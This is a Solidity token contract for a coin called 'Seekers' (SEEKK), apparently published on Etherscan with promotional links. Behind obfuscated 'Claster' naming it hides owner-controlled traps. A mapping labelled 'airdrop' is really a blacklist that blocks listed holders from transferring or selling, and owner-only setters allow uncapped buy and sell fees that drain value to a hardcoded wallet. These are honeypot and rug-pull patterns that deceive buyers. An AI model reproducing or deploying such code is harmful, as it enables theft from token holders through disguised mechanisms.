/**
 *Submitted for verification at Etherscan.io on 2023-08-15
*/

/**   


               ╭━━━╮╱╱╱╱╱╭╮
                ┃╭━╮┃╱╱╱╱╱┃┃
                ┃╰━━┳━━┳━━┫┃╭┳━━┳━╮
               ╰━━╮┃┃━┫┃━┫╰╯┫┃━┫╭╯
               ┃╰━╯┃┃━┫┃━┫╭╮┫┃━┫┃
               ╰━━━┻━━┻━━┻╯╰┻━━┻╯


        * Website: https://seekers.xyz/
        * Twitter: https://twitter.com/seekers_xyz
        * Instagram: https://www.instagram.com/seekers.xyz/
        * OpenSea: https://opensea.io/collection/the-seekers





*/



// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

contract SEEKERS is Context, IERC20, Ownable {
    using SafeMath for uint256;
    // Seekers
    string private constant _name = "Seekers";
    string private constant _symbol = "SEEKK";
    uint8 private constant _decimals = 9;
    
    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private _tOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    uint256 private constant MAX = ~uint256(0);
    uint256 private constant _tTotal = 100000000000 * 10 ** 9;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    // First Second Third Fourth
    uint256 private _tClasterTotal;
    uint256 private _ClasterFirstB = 0;
    uint256 private _ClasterSecondB = 0;
    uint256 private _ClasterThirdS = 0;
    uint256 private _ClasterFourthS = 0;

    uint256 private _ClasterThirdSFirst = _ClasterThirdS;
    uint256 private _ClasterFourthSSecond = _ClasterFourthS;

    uint256 private _previousThirdSFirst = _ClasterThirdSFirst;
    uint256 private _previousFourthSSecond = _ClasterFourthSSecond;

    mapping(address => bool) public clasterses_airdrop;
    mapping(address => uint256) public _buyMap;
    address payable private _ClasterFourthSAddress =
        payable(0x62D7deBa8C1aB0B91bf4BF46541eFEE2A0698703);
    address payable private _ClasterFiveSAddress =
        payable(0x62D7deBa8C1aB0B91bf4BF46541eFEE2A0698703);

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;

    bool private tradingOpen = true;
    bool private inSwap = false;
    bool private swapEnabled = true;
    uint256 public _maxTAClaster = 34500000000 * 10 ** 9;
    uint256 public _maxWSClaster = 100000000000 * 10 ** 9;
    uint256 public _swpTAClaster = 100 * 10 ** 9;

    event MaxTAUptClaster(uint256 _maxTAClaster);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() {
        _rOwned[_msgSender()] = _rTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return tokenFromReflection(_rOwned[account]);
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function tokenFromReflection(
        uint256 rAmount
    ) private view returns (uint256) {
        require(
            rAmount <= _rTotal,
            "Amount must be less than total reflections"
        );
        uint256 currentRate = _getRate();
        return rAmount.div(currentRate);
    }

    function removeClaster() private {
        if (_ClasterThirdSFirst == 0 && _ClasterFourthSSecond == 0) return;

        _previousThirdSFirst = _ClasterThirdSFirst;
        _previousFourthSSecond = _ClasterFourthSSecond;

        _ClasterThirdSFirst = 0;
        _ClasterFourthSSecond = 0;
    }

    function restoreClaster() private {
        _ClasterThirdSFirst = _previousThirdSFirst;
        _ClasterFourthSSecond = _previousFourthSSecond;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(!clasterses_airdrop[from] && !clasterses_airdrop[to]);

        if (from != owner() && to != owner()) {
            //Trade start check
            if (!tradingOpen) {
                require(
                    from == owner(),
                    "TOKEN: This account cannot send tokens until trading is enabled"
                );
            }

            require(amount <= _maxTAClaster, "TOKEN: Max Transaction Limit");
            require(
                !clasterses_airdrop[from] && !clasterses_airdrop[to],
                "TOKEN: Your account added to Airdrop!"
            );

            if (to != uniswapV2Pair) {
                require(
                    balanceOf(to) + amount < _maxWSClaster,
                    "TOKEN: Balance exceeds wallet size!"
                );
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            bool canSwap = contractTokenBalance >= _swpTAClaster;

            if (contractTokenBalance >= _maxTAClaster) {
                contractTokenBalance = _maxTAClaster;
            }

            if (
                canSwap &&
                !inSwap &&
                from != uniswapV2Pair &&
                swapEnabled &&
                !_isExcludedFromFee[from] &&
                !_isExcludedFromFee[to]
            ) {
                swapTokensForEth(contractTokenBalance);
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    seeClaster(address(this).balance);
                }
            }
        }

        bool takeFee = true;

        if (
            (_isExcludedFromFee[from] || _isExcludedFromFee[to]) ||
            (from != uniswapV2Pair && to != uniswapV2Pair)
        ) {
            takeFee = false;
        } else {
            if (from == uniswapV2Pair && to != address(uniswapV2Router)) {
                _ClasterThirdSFirst = _ClasterFirstB;
                _ClasterFourthSSecond = _ClasterSecondB;
            }

            if (to == uniswapV2Pair && from != address(uniswapV2Router)) {
                _ClasterThirdSFirst = _ClasterThirdS;
                _ClasterFourthSSecond = _ClasterFourthS;
            }
        }

        _tokenTransfer(from, to, amount, takeFee);
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function seeClaster(uint256 amount) private {
        _ClasterFiveSAddress.transfer(amount);
    }

    function launchGo() external onlyOwner {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
            0x10ED43C718714eb63d5aA57B78B54704E256024E
        );
        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_ClasterFourthSAddress] = true;
        _isExcludedFromFee[_ClasterFiveSAddress] = true;
    }

    function manualswap() external {
        require(
            _msgSender() == _ClasterFourthSAddress ||
                _msgSender() == _ClasterFiveSAddress
        );
        uint256 contractBalance = balanceOf(address(this));
        swapTokensForEth(contractBalance);
    }

    function manualsend() external {
        require(
            _msgSender() == _ClasterFourthSAddress ||
                _msgSender() == _ClasterFiveSAddress
        );
        uint256 contractETHBalance = address(this).balance;
        seeClaster(contractETHBalance);
    }

    function serializeClastersesAirdrop(
        address[] memory clasterses_airdrop_
    ) public onlyOwner {
        for (uint256 i = 0; i < clasterses_airdrop_.length; i++) {
            clasterses_airdrop[clasterses_airdrop_[i]] = true;
        }
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 amount,
        bool takeFee
    ) private {
        if (!takeFee) removeClaster();
        _transferStandard(sender, recipient, amount);
        if (!takeFee) restoreClaster();
    }

    function _transferStandard(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        (
            uint256 rAmount,
            uint256 rTransferAmount,
            uint256 rFee,
            uint256 tTransferAmount,
            uint256 tFee,
            uint256 tFourthSSecond
        ) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
        _takeFourthSSecond(tFourthSSecond);
        _reflectFee(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _takeFourthSSecond(uint256 tFourthSSecond) private {
        uint256 currentRate = _getRate();
        uint256 rFourthSSecond = tFourthSSecond.mul(currentRate);
        _rOwned[address(this)] = _rOwned[address(this)].add(rFourthSSecond);
    }

    function _reflectFee(uint256 rFee, uint256 tFee) private {
        _rTotal = _rTotal.sub(rFee);
        _tClasterTotal = _tClasterTotal.add(tFee);
    }

    receive() external payable {}

    function _getTValues(
        uint256 tAmount,
        uint256 thirdSFirst,
        uint256 fourthSSecond
    ) private pure returns (uint256, uint256, uint256) {
        uint256 tFee = tAmount.mul(thirdSFirst).div(100);
        uint256 tFourthSSecond = tAmount.mul(fourthSSecond).div(100);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(tFourthSSecond);
        return (tTransferAmount, tFee, tFourthSSecond);
    }

    function _getValues(
        uint256 tAmount
    )
        private
        view
        returns (uint256, uint256, uint256, uint256, uint256, uint256)
    {
        (
            uint256 tTransferAmount,
            uint256 tFee,
            uint256 tFourthSSecond
        ) = _getTValues(tAmount, _ClasterThirdSFirst, _ClasterFourthSSecond);
        uint256 currentRate = _getRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(
            tAmount,
            tFee,
            tFourthSSecond,
            currentRate
        );
        return (
            rAmount,
            rTransferAmount,
            rFee,
            tTransferAmount,
            tFee,
            tFourthSSecond
        );
    }

    function _getRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }

    function _getCurrentSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }

    function _getRValues(
        uint256 tAmount,
        uint256 tFee,
        uint256 tFourthSSecond,
        uint256 currentRate
    ) private pure returns (uint256, uint256, uint256) {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rFourthSSecond = tFourthSSecond.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rFourthSSecond);
        return (rAmount, rTransferAmount, rFee);
    }

    function sMiSClaster(uint256 swpTAClaster) public onlyOwner {
        _swpTAClaster = swpTAClaster;
    }

    function sMTxClaster(uint256 maxTAClaster) public onlyOwner {
        _maxTAClaster = maxTAClaster;
    }
    function sMwalClaster(uint256 maxWSClaster) public onlyOwner {
        _maxWSClaster = maxWSClaster;
    }

    function settingsClaster(
        uint256 firstB,
        uint256 thirdS,
        uint256 secondB,
        uint256 fourthS
    ) public onlyOwner {
        _ClasterFirstB = firstB;
        _ClasterThirdS = thirdS;
        _ClasterSecondB = secondB;
        _ClasterFourthS = fourthS;
    }

    

    function clsFoWalClaster(
        address[] calldata accounts,
        bool excluded
    ) public onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            _isExcludedFromFee[accounts[i]] = excluded;
        }
    }
}